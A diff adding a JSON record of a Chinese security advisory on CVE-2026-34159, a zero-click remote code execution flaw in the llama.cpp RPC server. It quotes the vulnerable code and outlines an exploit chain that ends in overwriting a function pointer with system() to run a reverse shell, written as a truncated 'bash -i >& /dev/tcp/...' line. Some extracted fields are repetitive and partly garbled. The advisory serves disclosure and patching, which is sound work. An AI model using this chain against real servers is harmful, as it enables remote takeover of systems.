@@ -1,0 +1,58 @@
+{
+  "mode": "llm",
+  "title": "LLM 推理引擎 llama.cpp 零点击 RCE 漏洞：从 Null Buffer 到绕过 PIE/Full RELRO/NX 利用链(CVE-2026-34159)",
+  "publisher": "360漏洞研究院",
+  "publish_date": "2026-04-28",
+  "table_fields": {
+    "漏洞名称": "llama.cpp RPC 服务零点击远程代码执行漏洞",
+    "漏洞编号": "CVE-2026-34159",
+    "公开时间": "2026-03-26",
+    "POC状态": "已公开",
+    "漏洞类型": "逻辑缺陷",
+    "EXP状态": "已公开",
+    "利用可能性": "高",
+    "技术细节状态": "已公开",
+    "CVSS 3.1": "9.8",
+    "在野利用状态": "未发现"
+  },
+  "sections": {
+    "intro_text": "安全研究团队 安全研究团队 2026-04-28 16:23 llama.cpp 曝出 RPC 服务零点击远程代码执行漏洞（CVE-2026-34159，CVSS 3.1：9.8），攻击者无需任何交互，仅需向开启 RPC 服务的后端发送构造的张量数据包，即可通过绕过内存边界校验实现任意地址读写，最终获取服务器系统权限。 利用条件限制： - 开启了 rpc-server 进程 - 攻击者能够访问RPC端口 目前 **360漏洞挖掘智能体已成功复现该漏洞** 。本文包含完整影响范围、修复方案、技术原理与复现细节，建议用户立即升级。 **漏洞影响范围** 受影响的软件版本： 受影响版本 buffer = reinterpret_cast (tensor->buffer); if (result->buffer && buffers.find(result->buffer) == buffers.end()) { result->buffer = nullptr; } // [2] 关键逻辑点：仅在 buffer != 0 时才执行边界校验 (Bounds Check) if (result->buffer) { uint64_t tensor_size = (uint64_t) ggml_nbytes(result); uint64_t buffer_start = (uint64_t) ggml_backend_buffer_get_base(result->buffer); GGML_ASSERT(tensor->data >= buffer_start && tensor->data + tensor_size buffer = 0，上述安全检查将被完全绕过 // [3] 漏洞点：地址赋值无条件执行 result->data = reinterpret_cast (tensor->data); // data 指向进程空间的**任意虚拟地址** 。配合 GGML_OP_CPY 指令，攻击者可构造出针对服务器内存的任意读写原语。 在防御绕过层面，由于 **Full RELRO** 仅保护 GOT 表，攻击者针对堆上分配的 ggml_backend_buffer_i 结构体（包含大量函数指针且可写）进行攻击。 **ASLR 绕过** ：泄露堆上虚表指针，逆向扫描 \\x7fELF 确定库基址。 **劫持执行** ：利用任意写原语，将 iface.clear 函数指针覆盖为 system() 地址，并将缓冲区起始位置填充为恶意指令（如反弹 Shell）。 **触发 RCE** ：调用 BUFFER_CLEAR，使服务器执行 buffer->iface.clear(buffer)，实质演变为 system(\"bash -i >& /dev/tcp/...\")。 **漏洞复现** 相关安全团队 漏洞研究院已成功复现 llama.cpp RPC 服务零点击远程代码执行漏洞（CVE-2026-34159）。在开启 PIE + Full RELRO + NX 的 Ubuntu 环境下完成 EXP 验证。通过构造多级张量计算图，成功突破内存防护限制，拿到 RPC 进程的反弹 Shell。 发送反弹 Shell 数据包到服务器 CVE-2026-34159 llama.cpp RPC 服务零点击远程代码执行漏洞复现 **时间线** 2026年04月28日，安全研究团队发布本安全风险通告。",
+    "security_update": "正式防护方案 受影响用户升级至 b8492 或更高版本。",
+    "component_text": "",
+    "vulnerability_text": "近日，官方披露了 llama.cpp RPC 服务零点击远程代码执行漏洞（CVE-2026-34159）。漏洞根源在于 RPC 服务器在处理传入张量（Tensor）反序列化时的逻辑校验缺失。在 ggml-rpc.cpp 的 deserialize_tensor 函数中，对 buffer 句柄的验证逻辑存在严重漏洞： 核心代码（ggml-rpc.cpp:1158）： ``` ggml_tensor * rpc_server::deserialize_tensor(struct ggml_context * ctx, const rpc_tensor * tensor){ // [1] 解析 buffer 句柄 result->buffer = reinterpret_cast<ggml_backend_buffer_t>(tensor->buffer); if (result->buffer && buffers.find(result->buffer) == buffers.end()) { result->buffer = nullptr; } // [2] 关键逻辑点：仅在 buffer != 0 时才执行边界校验 (Bounds Check) if (result->buffer) { uint64_t tensor_size = (uint64_t) ggml_nbytes(result); uint64_t buffer_start = (uint64_t) ggml_backend_buffer_get_base(result->buffer); GGML_ASSERT(tensor->data >= buffer_start && tensor->data + tensor_size <= buffer_start + buffer_size); } // ^^^^ 如果攻击者设置 tensor->buffer = 0，上述安全检查将被完全绕过 // [3] 漏洞点：地址赋值无条件执行 result->data = reinterpret_cast<void *>(tensor->data); // <-- 攻击者完全控制的任意地址 return result; } ``` 通过将 buffer 设为 0，攻击者可以使 result->data 指向进程空间的 任意虚拟地址 。配合 GGML_OP_CPY 指令，攻击者可构造出针对服务器内存的任意读写原语。 在防御绕过层面，由于 Full RELRO 仅保护 GOT 表，攻击者针对堆上分配的 ggml_backend_buffer_i 结构体（包含大量函数指针且可写）进行攻击。 ASLR 绕过 ：泄露堆上虚表指针，逆向扫描 \\x7fELF 确定库基址。 劫持执行 ：利用任意写原语，将 iface.clear 函数指针覆盖为 system() 地址，并将缓冲区起始位置填充为恶意指令（如反弹 Shell）。 触发 RCE ：调用 BUFFER_CLEAR，使服务器执行 buffer->iface.clear(buffer)，实质演变为 system(\"bash -i >& /dev/tcp/...\")。 漏洞复现 相关安全团队 漏洞研究院已成功复现 llama.cpp RPC 服务零点击远程代码执行漏洞（CVE-2026-34159）。在开启 PIE + Full RELRO + NX 的 Ubuntu 环境下完成 EXP 验证。通过构造多级张量计算图，成功突破内存防护限制，拿到 RPC 进程的反弹 Shell。 发送反弹 Shell 数据包到服务器 CVE-2026-34159 llama.cpp RPC 服务零点击远程代码执行漏洞复现",
+    "affected_versions_text": "受影响版本 < b8492",
+    "plain_text": "安全研究团队 安全研究团队 2026-04-28 16:23 llama.cpp 曝出 RPC 服务零点击远程代码执行漏洞（CVE-2026-34159，CVSS 3.1：9.8），攻击者无需任何交互，仅需向开启 RPC 服务的后端发送构造的张量数据包，即可通过绕过内存边界校验实现任意地址读写，最终获取服务器系统权限。 利用条件限制： - 开启了 rpc-server 进程 - 攻击者能够访问RPC端口 目前 **360漏洞挖掘智能体已成功复现该漏洞** 。本文包含完整影响范围、修复方案、技术原理与复现细节，建议用户立即升级。 **01** **漏洞影响范围** 受影响的软件版本： 受影响版本 buffer = reinterpret_cast (tensor->buffer); if (result->buffer && buffers.find(result->buffer) == buffers.end()) { result->buffer = nullptr; } // [2] 关键逻辑点：仅在 buffer != 0 时才执行边界校验 (Bounds Check) if (result->buffer) { uint64_t tensor_size = (uint64_t) ggml_nbytes(result); uint64_t buffer_start = (uint64_t) ggml_backend_buffer_get_base(result->buffer); GGML_ASSERT(tensor->data >= buffer_start && tensor->data + tensor_size buffer = 0，上述安全检查将被完全绕过 // [3] 漏洞点：地址赋值无条件执行 result->data = reinterpret_cast (tensor->data); // data 指向进程空间的**任意虚拟地址** 。配合 GGML_OP_CPY 指令，攻击者可构造出针对服务器内存的任意读写原语。 在防御绕过层面，由于 **Full RELRO** 仅保护 GOT 表，攻击者针对堆上分配的 ggml_backend_buffer_i 结构体（包含大量函数指针且可写）进行攻击。 **ASLR 绕过** ：泄露堆上虚表指针，逆向扫描 \\x7fELF 确定库基址。 **劫持执行** ：利用任意写原语，将 iface.clear 函数指针覆盖为 system() 地址，并将缓冲区起始位置填充为恶意指令（如反弹 Shell）。 **触发 RCE** ：调用 BUFFER_CLEAR，使服务器执行 buffer->iface.clear(buffer)，实质演变为 system(\"bash -i >& /dev/tcp/...\")。 **04** **漏洞复现** 相关安全团队 漏洞研究院已成功复现 llama.cpp RPC 服务零点击远程代码执行漏洞（CVE-2026-34159）。在开启 PIE + Full RELRO + NX 的 Ubuntu 环境下完成 EXP 验证。通过构造多级张量计算图，成功突破内存防护限制，拿到 RPC 进程的反弹 Shell。 发送反弹 Shell 数据包到服务器 CVE-2026-34159 llama.cpp RPC 服务零点击远程代码执行漏洞复现 **05** **时间线** 2026年04月28日，安全研究团队发布本安全风险通告。 **06** 参考链接 https://nvd.nist.gov/vuln/detail/CVE-2026-34159 07 更多漏洞情报 建议您订阅360数字安全-漏洞情报服务，获取更多漏洞情报详情以及处置建议，让您的企业远离漏洞威胁。 邮箱：360VRI@相关安全团队.cn 网址：https://vi.loudongyun.相关安全团队.net “洞”悉网络威胁，守护数字安全 **关于我们** 相关安全团队 漏洞研究院，隶属于360数字安全集团。其成员常年入选谷歌、微软、华为等厂商的安全精英排行榜, 并获得谷歌、微软、苹果史上最高漏洞奖励。研究院是中国首个荣膺Pwnie Awards“史诗级成就奖”，并获得多个Pwnie Awards提名的组织。累计发现并协助修复谷歌、苹果、微软、华为、高通等全球顶级厂商CVE漏洞3000多个，收获诸多官方公开致谢。研究院也屡次受邀在BlackHat，Usenix Security，Defcon等极具影响力的工业安全峰会和顶级学术会议上分享研究成果，并多次斩获信创挑战赛、天府杯等顶级黑客大赛总冠军和单项冠军。研究院将凭借其在漏洞挖掘和安全攻防方面的强大技术实力，帮助各大企业厂商不断完善系统安全，为数字安全保驾护航，筑造数字时代的安全堡垒。"
+  },
+  "reference_links": [
+    "https://nvd.nist.gov/vuln/detail/CVE-2026-34159"
+  ],
+  "reference_materials": [
+    {
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34159",
+      "content": "NVD - CVE-2026-34159 You are viewing this page in an unauthorized frame window. This is a potential security issue, you are being redirected to https://nvd.nist.gov An official website of the United States government Here's how you know Official websites use .gov A .gov website belongs to an official government organization in the United States. Secure .gov websites use HTTPS A lock ( ) or https:// means you've safely connected to the .gov website. Share sensitive information only on official, secure websites. NVD MENU General Expand or Collapse NVD Dashboard News and Status Updates FAQ Visualizations Legal Disclaimer Vulnerabilities Expand or Collapse Search & Statistics Weakness Types Data Feeds Vendor Comments CVMAP Vulnerability Metrics Expand or Collapse CVSS v4.0 Calculators CVSS v3.x Calculators CVSS v2.0 Calculator Products Expand or Collapse CPE Dictionary CPE Search CPE Statistics SWID Developers Expand or Collapse Start Here Request an API Key Vulnerabilities Products Data Sources Terms of Use Contact NVD Other Sites Expand or Collapse Checklist (NCP) Repository Configurations (CCE) 800-53 Controls SCAP Search Expand or Collapse Vulnerability Search CPE Search Information Technology Laboratory National Vulnerability Database National Vulnerability Database NVD Vulnerabilities CVE-2026-34159 Detail Undergoing Enrichment This CVE record is currently being enriched by team members, this process results in the association of reference link tags, CVSS, CWE, and CPE applicability statement data Description llama.cpp is an inference of several LLM models in C/C++. Prior to version b8492, the RPC backend's deserialize_tensor() skips all bounds validation when a tensor's buffer field is 0. An unauthenticated attacker can read and write arbitrary process memory via crafted GRAPH_COMPUTE messages. Combined with pointer leaks from ALLOC_BUFFER/BUFFER_GET_BASE, this gives full ASLR bypass and remote code execution. No authentication required, just TCP access to the RPC server port. This issue has been patched in version b8492. Metrics CVSS Version 4.0 CVSS Version 3.x CVSS Version 2.0 NVD enrichment efforts reference publicly available information to associate vector strings. CVSS information contributed by other sources is also displayed. CVSS 4.0 Severity and Vector Strings: NIST: NVD N/A NVD assessment not yet provided. CVSS 3.x Severity and Vector Strings: NIST: NVD Base Score: N/A NVD assessment not yet provided. CNA: GitHub, Inc. Base Score: 9.8 CRITICAL Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H CVSS 2.0 Severity and Vector Strings: NIST: NVD Base Score: N/A NVD assessment not yet provided. References to Advisories, Solutions, and Tools By selecting these links, you will be leaving NIST webspace. We have provided these links to other web sites because they may have information that would be of interest to you. No inferences should be drawn on account of other sites being referenced, or not, from this page. There may be other web sites that are more appropriate for your purpose. NIST does not necessarily endorse the views expressed, or concur with the facts presented on these sites. Further, NIST does not endorse any commercial products that may be mentioned on these sites. Please address comments about this page to [email protected] . URL Source(s) Tag(s) https://github.com/ggml-org/llama.cpp/commit/39bf0d3c6a95803e0f41aaba069ffbee26721042 GitHub, Inc. https://github.com/ggml-org/llama.cpp/pull/20908 GitHub, Inc. https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-j8rj-fmpv-wcxw GitHub, Inc. Weakness Enumeration CWE-ID CWE Name Source CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer GitHub, Inc. Change History 1 change records found show changes New CVE Received from GitHub, Inc. 4/01/2026 2:16:29 PM Action Type Old Value New Value Added Description llama.cpp is an inference of several LLM models in C/C++. Prior to version b8492, the RPC backend's deserialize_tensor() sk"
+    }
+  ],
+  "payload": {
+    "vulner_name": "llama.cpp RPC 服务逻辑缺陷漏洞",
+    "vulner_number_1": "CVE-2026-34159",
+    "vulner_number_2": "漏洞编号： CVE-2026-34159",
+    "new_vulner_name": "llama.cpp RPC 服务逻辑缺陷漏洞",
+    "vulner_date": "2026年4月28日",
+    "vulner_time_line": "2026/04/28",
+    "object_name": "llama.cpp",
+    "object_desc": "llama.cpp RPC 是 llama.cpp 推理框架的远程过程调用模块，通过网络接口暴露模型的推理能力，使客户端能够在本地或远程机器上执行大语言模型的推理任务。该组件通常部署于需要分布式推理或降低客户端资源占用的场景中。",
+    "vulner_version": "< llama.cpp b8492",
+    "vulner_type": "逻辑缺陷",
+    "user_auth": "不需要用户认证",
+    "pre_condition": "开启了 rpc-server 进程且攻击者能访问 RPC 端口",
+    "trigger_mode": "远程",
+    "utilize_difficulty": "高",
+    "hazard_level": "高",
+    "vuln_level": "严重",
+    "vulner_desc": "llama.cpp 在 b8492 之前版本中，RPC 后端的 deserialize_tensor() 函数在张量 buffer 字段为 0 时会跳过所有内存边界校验，导致 result->data 可被无条件赋值为任意虚拟地址。未经身份验证的攻击者仅需通过 TCP 连接向 RPC 服务端口发送精心构造的 GRAPH_COMPUTE 消息，即可获得任意进程内存读写原语。结合 ALLOC_BUFFER/BUFFER_GET_BASE 的指针泄漏可完整绕过 ASLR，最终实现远程代码执行。",
+    "official_solution": "升级至安全版本以修复远程代码执行漏洞\n修复版本：b8492 或更高版本\n下载链接：https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-j8rj-fmpv-wcxw",
+    "reference_link": "https://nvd.nist.gov/vuln/detail/CVE-2026-34159",
+    "reference_link1": "https://nvd.nist.gov",
+    "reference_link2": "https://github.com/ggml-org/llama.cpp/commit/39bf0d3c6a95803e0f41aaba069ffbee26721042"
+  }
+}
